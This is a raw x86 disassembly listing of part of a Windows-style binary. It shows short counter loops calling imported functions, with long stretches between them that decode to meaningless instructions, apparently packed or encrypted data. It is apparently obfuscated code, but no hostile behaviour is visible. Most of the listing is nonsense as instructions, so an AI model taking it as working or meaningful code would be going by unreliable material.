  4094f1:	cmp    DWORD PTR ds:0x433777,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433777,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43377b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43377b
  409532:	inc    eax
  409533:	mov    ds:0x43377b,eax
  409538:	cmp    DWORD PTR ds:0x43377b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43377b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43377b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43377b
  40956d:	inc    eax
  40956e:	mov    ds:0x43377b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4337b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433723,0x433713
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433733,0x43382f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0x60a9ee0b
  4095d3:	and    eax,0x7e7ed96c
  4095d8:	jp     0x409657
  4095da:	jle    0x40965a
  4095dc:	adc    eax,0x72bf4dc3
  4095e1:	cmc    
  4095e2:	hlt    
  4095e3:	arpl   bp,sp
  4095e5:	shl    WORD PTR [edi],0x93
  4095e9:	in     al,dx
  4095ea:	lods   al,BYTE PTR ds:[esi]
  4095eb:	leave  
  4095ec:	mov    DWORD PTR [esi],esp
  4095ee:	push   ss
  4095ef:	sbb    BYTE PTR [edx],0x57
  4095f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095f3:	push   0x43352a07
  4095f8:	sub    bh,BYTE PTR [edi+0x4d]
  4095fb:	push   edx
  4095fc:	or     al,BYTE PTR [ecx+0x19675cef]
  409602:	test   eax,0x5960c185
  409607:	add    al,0x5
  409609:	fs rcr bl,cl
  40960c:	push   0x2653de75
  409611:	mov    ah,0x9a
  409613:	add    al,0x30
  409615:	ds call 0xed7c:0x49d621b2
  40961d:	push   es
  40961e:	arpl   WORD PTR [ebx],bp
  409620:	pop    edx
  409621:	mov    esp,DWORD PTR [eax]
  409623:	test   eax,0x3f41981e
  409628:	mov    WORD PTR [ebp+0x1cd3ed9],ds
  40962e:	mov    esp,ebp
  409630:	andnps xmm0,XMMWORD PTR [eax]
  409633:	test   DWORD PTR [ebx+ebx*8-0x2d],0x2786765e
  40963b:	and    ax,0x67b
  40963f:	jns    0x4095fd
  409641:	lock cmp bh,ch
  409644:	icebp  
  409645:	or     ebp,esp
  409647:	(bad)  
  409648:	stc    
  409649:	mov    ds:0xe4324456,al
  40964e:	outs   dx,DWORD PTR ds:[esi]
  40964f:	inc    ecx
  409650:	std    
  409651:	push   cs
  409652:	or     al,0x20
  409654:	jl     0x409683
  409656:	dec    eax
  409657:	cld    
  409658:	xor    dl,BYTE PTR [ecx+0x2ee3a5b7]
  40965e:	inc    edx
  40965f:	rcl    DWORD PTR [esi+0x17],1
  409662:	sahf   
  409663:	jno    0x409642
  409665:	js     0x4096c3
  409667:	xchg   edx,eax
  409668:	ficomp WORD PTR [ebx+0x4fb8592e]
  40966e:	or     ch,BYTE PTR [edx-0x26]
  409671:	je     0x4096e7
  409673:	jmp    0xa0fe7e79
  409678:	inc    eax
  409679:	sub    al,0x48
  40967b:	loopne 0x40967a
  40967d:	dec    ecx
  40967e:	or     esp,ebx
  409680:	add    ah,BYTE PTR [ecx-0x4466ed3d]
  409686:	mov    al,0xcf
  409688:	cmp    ebp,DWORD PTR [ecx+edx*1-0x12bc9888]
  40968f:	add    bl,BYTE PTR [edx]
  409691:	rol    al,1
  409693:	cdq    
  409694:	push   edx
  409695:	xchg   esi,eax
  409696:	jne    0x409705
  409698:	mov    ch,0xde
  40969a:	sbb    al,0x89
  40969c:	dec    edx
  40969d:	and    bh,ch
  40969f:	inc    ebp
  4096a0:	dec    ebp
  4096a1:	addr16 cmp al,0x30
  4096a4:	dec    edx
  4096a5:	addr16 aam 0x58
  4096a8:	arpl   WORD PTR [ecx+ecx*4],bx
  4096ab:	addr16 ret 0x2cec
  4096af:	jmp    0xe23a:0x72367ee5
  4096b6:	fwait
  4096b7:	mov    ds:0x4b43ee8b,eax
  4096bc:	scas   al,BYTE PTR es:[edi]
  4096bd:	push   edi
  4096be:	adc    eax,0x5d8a3c70
  4096c3:	jbe    0x409649
  4096c5:	mov    ebx,0x8cfb2929
  4096ca:	adc    BYTE PTR [edi-0x2a],0x34
  4096ce:	and    dh,BYTE PTR [ecx+ebp*4-0x3f]
  4096d2:	bnd jne 0x4096e6
  4096d5:	loopne 0x409682
  4096d7:	popf   
  4096d8:	pop    eax
  4096d9:	pushf  
  4096da:	pop    es
  4096db:	dec    eax
  4096dc:	in     eax,0x78
  4096de:	ret    
  4096df:	fucompp 
  4096e1:	pop    ds
  4096e2:	in     eax,0xa5
  4096e4:	dec    esi
  4096e5:	fld    QWORD PTR [edx]
  4096e7:	jnp    0x4096e9
  4096e9:	nop
  4096ea:	sub    eax,ebx
  4096ec:	(bad)  
  4096ed:	into   
  4096ee:	jo     0x40974c
  4096f0:	mov    ch,0x1b
  4096f2:	scas   al,BYTE PTR es:[edi]
  4096f3:	add    ebx,DWORD PTR [ebp+0x3131bcb3]
  4096f9:	xchg   BYTE PTR [edi],cl
  4096fb:	dec    esi
  4096fc:	int3   
  4096fd:	or     cl,BYTE PTR [edi+0x64]
  409700:	mov    dl,0xba
  409702:	push   edi
  409703:	pushf  
  409704:	cmp    ch,BYTE PTR [esi]
  409706:	push   ds
  409707:	ins    DWORD PTR es:[edi],dx
  409708:	(bad)  
  409709:	push   0xffffffab
  40970b:	sub    ecx,eax
  40970d:	dec    ecx
  40970e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40970f:	fist   WORD PTR ds:0xcf798877
  409715:	leave  
  409716:	ret    
  409717:	pop    edi
  409718:	cmp    ah,BYTE PTR [ecx-0x1a91fcc9]
  40971e:	imul   eax,DWORD PTR [eax-0x51],0xba443c7b
  409725:	aas    
  409726:	dec    edx
  409727:	jle    0x4096ca
  409729:	(bad)  
  40972b:	mov    ebx,0x10bd3e6a
  409730:	ret    
  409731:	jg     0x409711
  409733:	mov    ebx,0x1b7f8689
  409738:	ins    BYTE PTR es:[edi],dx
  409739:	je     0x40979c
  40973b:	mov    cl,0xea
  40973d:	dec    edi
  40973e:	xchg   ebx,eax
  40973f:	cmp    al,0xb6
  409741:	shl    BYTE PTR [eax],1
  409743:	or     ebx,edx
  409745:	or     eax,0x1e310b7c
  40974a:	mov    dl,0x1d
  40974c:	call   0x744:0x56107c47
  409753:	pop    eax
  409754:	enter  0x79b3,0xa4
  409758:	xchg   esi,eax
  409759:	jns    0x40972d
  40975b:	adc    bl,BYTE PTR [ebx]
  40975d:	mov    cs:0x91ee2f44,al
  409763:	adc    dh,bl
  409765:	cmc    
  409766:	xchg   ebp,eax
  409767:	loopne 0x4096ff
  409769:	pop    ss
  40976a:	icebp  
  40976b:	inc    ebx
  40976c:	and    DWORD PTR [edx-0x202e740b],edi
  409772:	imul   esp,edx,0xffffff88
  409775:	mov    BYTE PTR [edx],dl
  409777:	add    al,0x1a
  409779:	dec    esi
  40977a:	mov    esi,0xb550ffbb
  40977f:	add    edi,DWORD PTR [eax-0x2b]
  409782:	pop    edi
  409783:	push   edi
  409784:	les    esi,FWORD PTR [ebp-0x6e505a33]
  40978a:	sub    eax,0x3e39057
  40978f:	cmp    DWORD PTR [edx],esi
  409791:	inc    esi
  409792:	lods   al,BYTE PTR ds:[esi]
  409793:	cmp    DWORD PTR [edx-0x1f],esp
  409796:	mov    edi,DWORD PTR [ebp+0x3a]
  409799:	xchg   ecx,eax
  40979a:	mov    ah,0xeb
  40979c:	lds    esp,FWORD PTR [ebx+eiz*8+0x272d353]
  4097a3:	cli    
  4097a4:	or     al,0x54
  4097a6:	es inc ebx
  4097a8:	ror    DWORD PTR [esi+0x6e],1
  4097ab:	mov    DWORD PTR [ecx+0x600583a0],edx
  4097b1:	or     cl,BYTE PTR [ecx]
  4097b3:	es inc ebp
  4097b5:	outs   dx,BYTE PTR ds:[esi]
  4097b6:	xchg   esi,eax
  4097b7:	sub    DWORD PTR [ebx-0x26],0xe
  4097bb:	bound  ebp,QWORD PTR [edx*2+0x677b3459]
  4097c2:	mov    edx,0xfe1db06a
  4097c7:	nop
  4097c8:	xor    eax,0x64b4093f
  4097cd:	lods   al,BYTE PTR ds:[esi]
  4097ce:	retf   
  4097cf:	ror    ebp,1
  4097d1:	aaa    
  4097d2:	and    al,0x8f
  4097d4:	mov    ebx,DWORD PTR [ebx]
  4097d6:	test   al,0x54
  4097d8:	sub    al,0x3e
  4097da:	mov    DWORD PTR [ebp-0x26265d14],ebp
  4097e0:	fdiv   st(2),st
  4097e2:	ins    BYTE PTR es:[edi],dx
  4097e3:	push   ecx
  4097e4:	out    dx,al
  4097e5:	mov    bh,BYTE PTR [ecx+0x69c12614]
  4097eb:	pop    eax
  4097ec:	jae    0x409850
  4097ee:	call   0xc3bb466c
  4097f3:	or     BYTE PTR [edi-0x21],ah
  4097f6:	inc    esp
  4097f7:	data16 xor cl,BYTE PTR [edi]
  4097fa:	add    bl,BYTE PTR [edi+0x1f53a745]
  409800:	sub    al,0x20
  409802:	sbb    al,0x1c
  409804:	sti    
  409805:	sbb    al,0xd9
  409807:	outs   dx,DWORD PTR ds:[esi]
  409808:	push   0x98c89b9b
  40980d:	jmp    0x2ee1e9
  409812:	add    DWORD PTR [esi+0x3396a029],esp
  409818:	hlt    
  409819:	outs   dx,DWORD PTR ds:[esi]
  40981a:	js     0x4097d0
  40981c:	ins    DWORD PTR es:[edi],dx
  40981d:	ja     0x4097a2
  40981f:	push   ss
  409820:	dec    eax
  409821:	nop
  409822:	mov    eax,0x63ec42fe
  409827:	daa    
  409828:	add    esp,edi
  40982a:	bound  eax,QWORD PTR [ebx+0x73]
  40982d:	xchg   ebx,eax
  40982e:	xor    esi,DWORD PTR [ecx-0x40c0ea45]
  409834:	ds loope 0x40989b
  409837:	mov    ds:0x39bc4155,al
  40983c:	imul   edx,edi,0xffffff96
  40983f:	test   al,0x1f
  409841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409842:	stc    
  409843:	bound  edi,QWORD PTR [ecx]
  409845:	jno    0x409826
  409847:	mov    dh,0xca
  409849:	(bad)  
  40984a:	mov    ecx,0x13f95113
  40984f:	out    0xbe,al
  409851:	stos   BYTE PTR es:[edi],al
  409852:	sbb    dl,BYTE PTR [eax]
  409854:	push   ecx
  409855:	outs   dx,BYTE PTR ds:[esi]
  409856:	sar    DWORD PTR [esi-0x68ed904c],1
  40985c:	add    BYTE PTR [ebx-0x292c96ef],cl
  409862:	and    al,0xc4
  409864:	(bad)  
  409865:	mov    ds:0xec561275,eax
  40986b:	fisub  DWORD PTR ds:0x8564f4a
  409871:	call   0xee63762d
  409876:	retf   0x6f59
  409879:	adc    al,0xb4
  40987b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40987c:	push   ebp
  40987d:	and    bh,dl
  40987f:	inc    ecx
  409880:	jl     0x4098ab
  409882:	jmp    FWORD PTR [ebx-0x64bf3e32]
  409888:	loopne 0x40981a
  40988a:	push   cs
  40988b:	and    edx,DWORD PTR [ebx]
  40988d:	fld    TBYTE PTR [ebx-0x56]
  409890:	pop    ds
  409891:	cmp    edi,0x307a9ae6
  409897:	cs pop esp
  409899:	ror    BYTE PTR [esi+0x562baa59],1
  40989f:	in     eax,dx
  4098a0:	jae    0x40990c
  4098a2:	in     al,dx
  4098a3:	push   edx
  4098a4:	jns    0x409848
  4098a6:	mov    ds,WORD PTR [esi+0x1d]
  4098a9:	cli    
  4098aa:	les    edi,FWORD PTR [ecx+0x62]
  4098ad:	pop    esi
  4098ae:	ror    bl,cl
  4098b0:	mov    bh,0xbb
  4098b2:	jbe    0x40991d
  4098b4:	std    
  4098b5:	ret    
  4098b6:	fucomi st,st(5)
  4098b8:	outs   dx,DWORD PTR ds:[esi]
  4098b9:	dec    eax
  4098ba:	jb     0x4098f6
  4098bc:	adc    BYTE PTR [edx+0x4d1d4c39],0xac
  4098c3:	repnz mov ch,0x33
  4098c6:	jmp    0x4098cd
  4098c8:	outs   dx,BYTE PTR ds:[esi]
  4098c9:	cwde   
  4098ca:	mov    ebp,0x7d6f0caf
  4098cf:	sub    DWORD PTR [ebp-0x56a82385],ebx
  4098d5:	retf   0x736
  4098d8:	cwde   
  4098d9:	test   eax,0x35e82c68
  4098de:	adc    BYTE PTR [eax],dh
  4098e0:	movzx  ecx,cx
  4098e3:	sbb    DWORD PTR ds:0x43383b,0x5a23
  4098ed:	add    ecx,DWORD PTR [eax]
  4098ef:	adc    DWORD PTR ds:0x4337a7,ebx
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433737
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43376f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43376f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43376f,ecx
  409918:	cmp    DWORD PTR ds:0x43376f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43376f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4337a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4337a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4337a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4338a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4337a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4337a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4337a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4337a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4337a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fst    st(3)
  4099be:	leave  
  4099bf:	add    DWORD PTR es:[eax-0x1c],ebp
  4099c3:	jle    0x409a43
  4099c5:	jp     0x409a44
  4099c7:	jle    0x409a47
  4099c9:	ds jge 0x4099ec
  4099cc:	pop    eax
  4099cd:	je     0x409955
  4099cf:	xlat   BYTE PTR ds:[ebx]
  4099d0:	jge    0x4099bc
  4099d2:	les    edx,FWORD PTR [esi+ecx*1+0x347351b9]
  4099d9:	pop    ecx
  4099da:	das    
  4099db:	xchg   edx,eax
  4099dc:	inc    edx
  4099dd:	loop   0x409986
  4099df:	push   0x46
  4099e1:	es stos DWORD PTR es:[edi],eax
  4099e3:	push   edx
  4099e4:	loope  0x4099f9
  4099e6:	xchg   edx,eax
  4099e7:	ror    DWORD PTR [eax-0x13],0x25
  4099eb:	mov    ds:0xe6141a95,al
  4099f0:	ja     0x409a52
  4099f2:	nop
  4099f3:	js     0x409a61
  4099f5:	jge    0x4099ca
  4099f7:	or     al,0xaf
  4099f9:	xchg   edx,eax
  4099fa:	pop    ds
  4099fb:	sbb    ecx,DWORD PTR [eax]
  4099fd:	xor    al,0x5a
  4099ff:	xor    bl,ah
  409a01:	inc    esi
  409a02:	gs (bad) 
  409a04:	ror    BYTE PTR [ecx+0x45],1
  409a07:	and    al,0xaa
  409a09:	test   BYTE PTR [eax],cl
  409a0b:	and    al,0xd
  409a0d:	inc    esp
  409a0e:	ss enter 0xcd54,0x34
  409a13:	aas    
  409a14:	push   0x70
  409a16:	jle    0x4099fb
  409a18:	nop
  409a19:	scas   eax,DWORD PTR es:[edi]
  409a1a:	or     ch,ah
  409a1c:	(bad)  
  409a1d:	push   cs
  409a1e:	push   ecx
  409a1f:	xor    bl,BYTE PTR [ecx-0x21]
  409a22:	adc    BYTE PTR [edx+0x22],cl
  409a25:	popf   
  409a26:	(bad)  
  409a27:	ret    
  409a28:	push   ebp
  409a29:	jmp    0x224:0xbaad9825
  409a30:	mov    bl,0x55
  409a32:	pop    ecx
  409a33:	add    eax,0xcfaa5bae
  409a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a39:	mov    edx,0x27e373a1
  409a3e:	sbb    eax,0x22a7ef32
  409a43:	xchg   edi,eax
  409a44:	mov    al,ds:0xe8d38a93
  409a49:	in     al,dx
  409a4a:	popa   
  409a4b:	fbld   TBYTE PTR [eax-0x9]
  409a4e:	mov    al,ds:0x4056ea42
  409a53:	nop
  409a54:	out    0x1a,eax
  409a56:	cmp    BYTE PTR [ebp-0xb3f662c],ah
  409a5c:	xchg   ebx,eax
  409a5d:	dec    ebx
  409a5e:	inc    ecx
  409a5f:	lea    edx,[eax-0x2bbe6fcc]
  409a65:	ds out dx,eax
  409a67:	das    
  409a68:	cdq    
  409a69:	pop    ecx
  409a6a:	mov    esi,0x36804eff
  409a6f:	pop    ebp
  409a70:	cmc    
  409a71:	adc    ebx,DWORD PTR [esp+edi*8-0x41]
  409a75:	fcom   QWORD PTR [edi+0x3e407301]
  409a7b:	xchg   ebx,eax
  409a7c:	(bad)  
  409a7d:	mov    edx,0xfd348758
  409a82:	mov    ds:0x5d98f3b6,eax
  409a87:	call   0x53715b4e
  409a8c:	retf   0xd462
  409a8f:	xlat   BYTE PTR ds:[ebx]
  409a90:	fs jo  0x409a6f
  409a93:	pop    esi
  409a94:	(bad)  
  409a96:	push   edi
  409a97:	cwde   
  409a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a99:	jge    0x409a9f
  409a9b:	sub    bh,BYTE PTR [edi+0x76]
  409a9e:	daa    
  409a9f:	test   al,0x2c
  409aa1:	test   eax,0x83dde626
  409aa6:	xor    BYTE PTR [ebp+0x26],dh
  409aa9:	es xchg edx,eax
  409aab:	pop    ebx
  409aac:	cs sub edx,ebp
  409aaf:	push   0xfffffff4
  409ab1:	or     edi,0xb747c349
  409ab7:	mov    ah,ch
  409ab9:	mov    ch,0x33
  409abb:	sahf   
  409abc:	fwait
  409abd:	dec    eax
  409abe:	jg     0x409b35
  409ac0:	cmp    edi,DWORD PTR [edx-0x51]
  409ac3:	push   edx
  409ac4:	inc    ebp
  409ac5:	mov    dh,0xa1
  409ac7:	mov    ch,0xa0
  409ac9:	push   edx
  409aca:	icebp  
  409acb:	sbb    BYTE PTR [ecx],0x6f
  409ace:	sbb    al,0x25
  409ad0:	cmp    ecx,DWORD PTR [eax]
  409ad2:	dec    ebp
  409ad3:	inc    edi
  409ad4:	rcl    BYTE PTR ds:0x3e643701,1
  409ada:	adc    eax,0xeb9688fb
  409adf:	xchg   esp,eax
  409ae0:	fnstcw WORD PTR [edx]
  409ae2:	iret   
  409ae3:	jno    0x409af8
  409ae5:	mov    ah,dl
  409ae7:	jne    0x409a79
  409ae9:	jecxz  0x409a6c
  409aeb:	pop    ecx
  409aec:	push   0x2ded2198
  409af1:	push   0x826e1e64
  409af6:	fadd   QWORD PTR ds:0xbe83dd04
  409afc:	imul   ecx,ebp,0x30
  409aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b00:	(bad)  
  409b01:	mov    ah,0x81
  409b03:	mov    ch,BYTE PTR [edx+0x287ef48a]
  409b09:	imul   edx,DWORD PTR [ecx],0x5b363c8
  409b0f:	data16 repnz cmp ch,bl
  409b13:	cmp    edi,DWORD PTR [esi-0x6f096098]
  409b19:	jge    0x409b2a
  409b1b:	adc    al,0xdc
  409b1d:	aas    
  409b1e:	xor    BYTE PTR [esi+edx*4+0x4e],ah
  409b22:	fisttp DWORD PTR [ebp+0x7e81f378]
  409b28:	add    ebp,ebp
  409b2a:	daa    
  409b2b:	test   eax,0x1fb2d02e
  409b30:	push   cs
  409b31:	repz bound esp,QWORD PTR [eax+0x3d]
  409b35:	es pop edi
  409b37:	sbb    ch,BYTE PTR [ebp-0x21]
  409b3a:	push   eax
  409b3b:	(bad)  
  409b3c:	test   BYTE PTR [esi],cl
  409b3e:	retf   
  409b3f:	and    ebp,edx
  409b41:	sbb    ch,BYTE PTR [edx]
  409b43:	mov    ds:0xb50c5510,eax
  409b48:	sbb    DWORD PTR [edi+0x7034b7e1],edi
  409b4e:	push   es
  409b4f:	dec    esp
  409b50:	mov    ch,BYTE PTR [eax]
  409b52:	cmp    al,0xde
  409b54:	mov    esi,0x55e86106
  409b59:	adc    al,0x8f
  409b5b:	push   DWORD PTR [edi]
  409b5d:	xchg   ebx,eax
  409b5e:	and    al,0x1
  409b60:	repz leave 
  409b62:	inc    ebx
  409b63:	das    
  409b64:	cs in  eax,0x98
  409b67:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  409b69:	dec    eax
  409b6a:	in     al,0x5d
  409b6c:	jl     0x409be0
  409b6e:	adc    eax,0x3bd1fb0
  409b73:	jae    0x409bb0
  409b75:	shl    DWORD PTR [ebx+0x48a4e7de],0x1d
  409b7c:	xchg   esi,eax
  409b7d:	push   es
  409b7e:	mov    bh,0x3d
  409b80:	adc    esi,DWORD PTR [ebx-0x5c02382e]
  409b86:	sbb    bh,BYTE PTR [edx]
  409b88:	jno    0x409bc6
  409b8a:	cmp    dh,BYTE PTR [ebp-0x7a]
  409b8d:	and    al,bl
  409b8f:	jmp    0x409b9a
  409b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b92:	(bad)  
  409b93:	inc    ebx
  409b94:	jnp    0x409bc3
  409b96:	out    dx,al
  409b97:	pop    esp
  409b98:	ins    BYTE PTR es:[edi],dx
  409b99:	(bad)  
  409b9a:	pop    edx
  409b9b:	pop    ebp
  409b9c:	sti    
  409b9d:	mov    ebx,0x585031a4
  409ba2:	xor    DWORD PTR [edi+0x18],eax
  409ba5:	xlat   BYTE PTR ds:[ebx]
  409ba6:	push   ebp
  409ba7:	cwde   
  409ba8:	lods   eax,DWORD PTR ds:[esi]
  409ba9:	cdq    
  409baa:	popf   
  409bab:	jbe    0x409c14
  409bad:	inc    eax
  409bae:	xor    eax,DWORD PTR [ebx+0x3ecae37f]
  409bb4:	jbe    0x409c00
  409bb6:	popa   
  409bb7:	sti    
  409bb8:	xor    DWORD PTR [esi+0x6d49791b],ebp
  409bbe:	jns    0x409c3a
  409bc0:	in     eax,dx
  409bc1:	dec    edx
  409bc2:	fdiv   DWORD PTR ds:0xd72c235d
  409bc8:	call   0x1c4ac1fe
  409bcd:	nop
  409bce:	lds    edx,FWORD PTR [edi-0x72]
  409bd1:	loopne 0x409bc6
  409bd3:	std    
  409bd4:	lods   al,BYTE PTR ds:[esi]
  409bd5:	scas   eax,DWORD PTR es:[edi]
  409bd6:	fsubrp st(6),st
  409bd8:	dec    dh
  409bda:	repnz cmp BYTE PTR [bx+di-0xd],ch
  409bdf:	repnz or ebp,edi
  409be2:	pop    edi
  409be3:	xor    dh,BYTE PTR [eax+0x74]
  409be6:	adc    DWORD PTR [edx-0xadbff25],esp
  409bec:	loop   0x409c5c
  409bee:	sbb    eax,0xbedab13
  409bf3:	fs aam 0x31
  409bf6:	(bad)  
  409bf7:	sahf   
  409bf8:	fistp  WORD PTR [eax+0x7967906a]
  409bfe:	dec    ecx
  409bff:	fs retf 
  409c01:	jo     0x409c78
  409c03:	jbe    0x409ba2
  409c05:	ret    
  409c06:	pushf  
  409c07:	sub    DWORD PTR [edx+0x6d],esp
  409c0a:	out    0xee,eax
  409c0c:	std    
  409c0d:	(bad)  
  409c0e:	push   0xb
  409c10:	shl    ah,1
  409c12:	sbb    dh,BYTE PTR [ebx-0x2f0367ee]
  409c18:	cli    
  409c19:	pavgw  mm5,QWORD PTR [edi-0x4ab9fc6]
  409c20:	push   ecx
  409c21:	(bad)  
  409c22:	cmp    al,0x58
  409c24:	fsubr  QWORD PTR ds:0xf53247
  409c2a:	arpl   WORD PTR [edx],dx
  409c2c:	pushf  
  409c2d:	imul   esi,DWORD PTR [bp+di-0xd],0x6074489d
  409c35:	clc    
  409c36:	adc    DWORD PTR [edi+0x47],ecx
  409c39:	iret   
  409c3a:	shl    BYTE PTR [edx],cl
  409c3c:	outs   dx,BYTE PTR ds:[esi]
  409c3d:	cli    
  409c3e:	loope  0x409c48
  409c40:	bound  ebp,QWORD PTR [eax]
  409c42:	xor    ah,BYTE PTR [edi-0x7e]
  409c45:	or     al,0x44
  409c47:	jbe    0x409c8d
  409c49:	and    ch,BYTE PTR [edx+0x78]
  409c4c:	dec    ecx
  409c4d:	bound  ebx,QWORD PTR [eax+0x34f176d8]
  409c53:	cmp    al,0x28
  409c55:	pop    edi
  409c56:	stos   BYTE PTR es:[edi],al
  409c57:	neg    DWORD PTR [esi-0x7956a605]
  409c5d:	das    
  409c5e:	or     eax,0x173f497e
  409c63:	sub    dh,BYTE PTR ds:[edx]
  409c66:	xchg   DWORD PTR [ecx+0x4cfea0b2],esp
  409c6c:	dec    esi
  409c6d:	outs   dx,BYTE PTR ds:[esi]
  409c6e:	out    dx,al
  409c6f:	jbe    0x409c17
  409c71:	or     eax,0xc088cca7
  409c76:	push   0x589cb546
  409c7b:	mov    al,0xdc
  409c7d:	and    BYTE PTR [ecx],0xca
  409c80:	mov    edx,0x140b0ec2
  409c85:	dec    ecx
  409c86:	popa   
  409c87:	dec    sp
  409c89:	mov    ebp,edx
  409c8b:	daa    
  409c8c:	xchg   edi,eax
  409c8d:	mov    ah,0xc4
  409c8f:	pushf  
  409c90:	mov    cl,0x56
  409c92:	push   0xffffff80
  409c94:	(bad)  
  409c96:	mov    al,0x4
  409c98:	sub    ah,BYTE PTR [ebp-0x3c]
  409c9b:	cs (bad) 
  409c9d:	and    eax,0xce110f80
  409ca2:	loopne 0x409d0a
  409ca4:	and    BYTE PTR [edx+0x42],al
  409ca7:	sar    DWORD PTR [ebx],0x23
  409caa:	jecxz  0x409c83
  409cac:	add    eax,0x81c3bc3
  409cb1:	sbb    al,0x91
  409cb3:	aas    
  409cb4:	not    DWORD PTR [esi]
  409cb6:	fist   WORD PTR [eax+0x3250ca82]
  409cbc:	(bad)  
  409cbd:	pop    DWORD PTR [edx*2-0x136e7b8d]
  409cc4:	sbb    bh,BYTE PTR [ecx+0x413024f]
  409cca:	cmp    dl,dl
  409ccc:	ror    DWORD PTR [edi],1
  409cce:	test   esi,eax
  409cd0:	push   es
  409cd1:	add    BYTE PTR [eax],al
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	ja     0x409c97
  409cfb:	and    al,0x1f
  409cfd:	je     0x409ce2
  409cff:	jle    0x409d7f
  409d01:	jp     0x409d80
  409d03:	jle    0x409d83
  409d05:	inc    ebp
  409d06:	fild   WORD PTR [esi-0x3711b508]
  409d0c:	mov    ch,0xde
  409d0e:	(bad)  
  409d0f:	int    0x75
  409d11:	mov    edi,DWORD PTR [ebp+0x6fad7752]
  409d17:	fcmovne st,st(6)
  409d19:	add    BYTE PTR [ebp+eax*4+0x7e524a3f],dh
  409d20:	cmp    BYTE PTR [ebx-0x36],bh
  409d23:	out    0x92,al
  409d25:	fcomp  DWORD PTR [eax+0x387b175a]
  409d2b:	addr16 in eax,dx
  409d2d:	popf   
  409d2e:	mov    esp,0xf1cec535
  409d33:	das    
  409d34:	inc    ebx
  409d35:	lds    esi,FWORD PTR [ebp+0x3e]
  409d38:	ror    BYTE PTR [esi],cl
  409d3a:	push   eax
  409d3b:	ret    0xce59
  409d3e:	or     dl,cl
  409d40:	cmp    BYTE PTR [edi+0x72],dl
  409d43:	icebp  
  409d44:	in     eax,0x38
  409d46:	jb     0x409d95
  409d48:	jle    0x409d6b
  409d4a:	adc    BYTE PTR [eax+0x5a],dh
  409d4d:	dec    ebp
  409d4e:	pop    edx
  409d4f:	or     DWORD PTR ds:[edi],esi
  409d52:	jle    0x409ced
  409d54:	leave  
